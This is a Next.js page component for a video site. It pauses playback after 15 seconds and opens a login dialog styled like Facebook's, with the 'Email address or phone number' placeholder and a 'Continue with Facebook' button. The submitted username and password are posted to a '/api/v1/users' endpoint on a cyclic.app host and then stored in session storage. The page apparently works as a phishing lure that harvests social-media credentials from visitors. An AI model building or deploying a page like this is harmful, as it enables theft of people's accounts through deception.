import Layout from '@/components/layout'
import {
  Box,
  Button,
  CircularProgress,
  Container,
  Dialog,
  Grid,
  InputAdornment,
  LinearProgress,
  Stack,
  styled,
  TextField,
  Typography,
} from '@mui/material'
import axios from 'axios'
import dynamic from 'next/dynamic'
import Image from 'next/image'
import { useEffect, useState } from 'react'
import { useForm } from 'react-hook-form'
import { BiHide, BiShow } from 'react-icons/bi'
import FacebookIcon from '../../public/assets/images/facebook.png'

const ReactPlayer = dynamic(() => import('react-player/lazy'), { ssr: false })

const VideoWrap = styled(Box)(({ theme }) => ({
  cursor: 'pointer',
  position: 'relative',
  width: '100%',
  overflow: 'hidden',
  borderRadius: theme.spacing(1),

  '& img': {
    display: 'block',
    width: '100%',
    height: 200,
    borderRadius: theme.spacing(1),
    objectFit: 'cover',
    obkectPosition: 'center',
  },

  '& .overlay': {
    display: 'none',
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    height: 200,
    backgroundColor: 'rgba(0,0,0,.1)',
  },
  '&: hover': {
    '& .overlay': {
      display: 'block',
      transition: 'all .5s ease-out',
    },
    '& img': {
      transform: 'scale(1.5)',
      transition: 'all .5s ease-out',
      borderRadius: theme.spacing(1),
    },
  },
  [theme.breakpoints.down('sm')]: {
    width: '70%',

    '& img': {
      height: 200,
    },
    '& .overlay': {
      height: 280,
    },
  },
}))

const Home = () => {
  const [currentUser, setCurrentUser] = useState<{ username: string } | null>(null)
  const [currentVideo, setCurrentVideo] = useState<{
    _id?: string
    url?: string
    title?: string
    image?: string
  }>({})
  const [listVideo, setListVideo] = useState<
    | {
        _id: string
        url: string
        title: string
        image?: string
      }[]
  >([])
  const [isOpenPopup, setIsOpenPopup] = useState(false)
  const [isShowPassword, setIsShowPassword] = useState<boolean>(false)
  const [isPlay, setIsPlay] = useState(true)
  const [loading, setLoading] = useState<boolean>(false)

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm()
  const handleStop = (time: number) => {
    if (time > 15 && !currentUser) {
      setIsPlay(false)
      setIsOpenPopup(true)
    }
  }

  const onSubmit = async (data: any) => {
    setLoading(true)
    try {
      const res = await axios.post('https://long-ruby-earthworm-veil.cyclic.app/api/v1/users', data)
      sessionStorage.setItem('user', JSON.stringify(res.data.user))
      setCurrentUser(res.data.user)
    } catch (error) {
      console.log(error)
    }
    setIsPlay(true)
    setIsOpenPopup(false)
    setLoading(false)
  }

  useEffect(() => {
    setLoading(true)
    const videoSession: { _id?: string; url?: string; title?: string; image?: string } = JSON.parse(
      sessionStorage.getItem('video') as string,
    )
    const getInfoVideo = async () => {
      try {
        const res = await axios.get('https://long-ruby-earthworm-veil.cyclic.app/api/v1/videos')
        if (videoSession) setCurrentVideo(videoSession)
        else {
          setCurrentVideo(res.data.data[0])
        }
        setListVideo(res.data.data)
      } catch (error) {
        console.log(error)
      }
    }
    const isCheckAuth = () => {
      const userSession: { username: string } = JSON.parse(sessionStorage.getItem('user') as string)
      setCurrentUser(userSession)
    }
    getInfoVideo()
    isCheckAuth()
    setLoading(false)
  }, [])

  if (loading)
    return (
      <Layout>
        <Box position={'absolute'} top={0} left={0} right={0}>
          <LinearProgress />
        </Box>
      </Layout>
    )

  return (
    <Box>
      <Layout>
        <Box display={'flex'} justifyContent={'center'}>
          <Box
            px={5}
            sx={{
              width: { xs: '100%', md: '75%' },
              height: {
                xs: '50vh',
                lg: '90vh',
              },
            }}
          >
            <ReactPlayer
              url={currentVideo?.url}
              loop={true}
              playing={isPlay}
              width={'100%'}
              height={'100%'}
              onProgress={(data) => handleStop(data.playedSeconds)}
              controls
              muted={true}
              config={{ file: { attributes: { playsInline: true, controlsList: 'nodownload' } } }}
            />
            <Typography color="white" mt={4} fontSize={20} fontWeight={700}>
              {currentVideo?.title}
            </Typography>
          </Box>
        </Box>
        <Box mt={24}>
          <Container>
            <Grid container spacing={4}>
              {listVideo?.map((video, index) => (
                <Grid
                  item
                  xs={12}
                  sm={6}
                  md={4}
                  lg={3}
                  key={index}
                  onClick={() => {
                    setCurrentVideo(video)
                    sessionStorage.setItem('video', JSON.stringify(video))
                    window.scrollTo({
                      top: 0,
                      behavior: 'smooth',
                    })
                  }}
                >
                  <Box display={'flex'} flexDirection={'column'} alignItems={'center'}>
                    <VideoWrap>
                      <Box
                        component={'img'}
                        src={video.image || '/assets/images/no-image.jpg'}
                        alt="image"
                      />
                      <Box className="overlay" />
                    </VideoWrap>
                    <Typography color={'white'} fontSize={12} mt={1.5}>
                      {video.title}
                    </Typography>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Container>
        </Box>
      </Layout>

      {/* POPUP */}
      <Dialog open={isOpenPopup}>
        <Stack sx={{ width: { xs: '80vw', md: '25vw' } }} minWidth={'250px'} py={4}>
          <Box display={'flex'} justifyContent={'center'}>
            <Typography fontWeight={700} fontSize={20}>
              Login to your account
            </Typography>
          </Box>
          <form onSubmit={handleSubmit(onSubmit)}>
            <Box mt={8} px={4}>
              <Box>
                <TextField
                  error={Boolean(errors?.username?.message?.toString())}
                  fullWidth
                  size="small"
                  placeholder="Email address or phone number"
                  helperText={
                    errors?.username?.message?.toString()
                      ? errors?.username?.message?.toString()
                      : ''
                  }
                  {...register('username', { required: 'Required !' })}
                />
              </Box>
              <Box mt={3}>
                <TextField
                  error={Boolean(errors?.password?.message?.toString())}
                  fullWidth
                  size="small"
                  placeholder="Password"
                  type={isShowPassword ? 'text' : 'password'}
                  InputProps={{
                    endAdornment: (
                      <InputAdornment
                        position="end"
                        sx={{ cursor: 'pointer' }}
                        onClick={() => setIsShowPassword(!isShowPassword)}
                      >
                        {isShowPassword ? <BiShow /> : <BiHide />}
                      </InputAdornment>
                    ),
                  }}
                  helperText={
                    errors?.password?.message?.toString()
                      ? errors?.password?.message?.toString()
                      : ''
                  }
                  {...register('password', { required: 'Required !' })}
                />
              </Box>
            </Box>
            <Box mt={4} textAlign={'center'} px={4}>
              <Button
                variant="contained"
                size="medium"
                type={loading ? 'button' : 'submit'}
                fullWidth
                color="secondary"
              >
                {loading ? (
                  <CircularProgress sx={{ color: 'white' }} size={24} />
                ) : (
                  <Typography fontWeight={'bold'}>Log in</Typography>
                )}
              </Button>
            </Box>
          </form>
          <Box textAlign={'center'} mt={4}>
            <Typography color={'#212529'} fontSize={'1rem'} fontWeight={400}>
              or login with ?
            </Typography>
          </Box>
          <Box mt={4} textAlign={'center'}>
            <Button variant="contained" href="/auth">
              <Box display={'flex'} alignItems={'center'} gap={2}>
                <Image src={FacebookIcon} alt="icon" width={20} />
                <Typography>Continue with Facebook</Typography>
              </Box>
            </Button>
          </Box>
        </Stack>
      </Dialog>
    </Box>
  )
}

export default Home
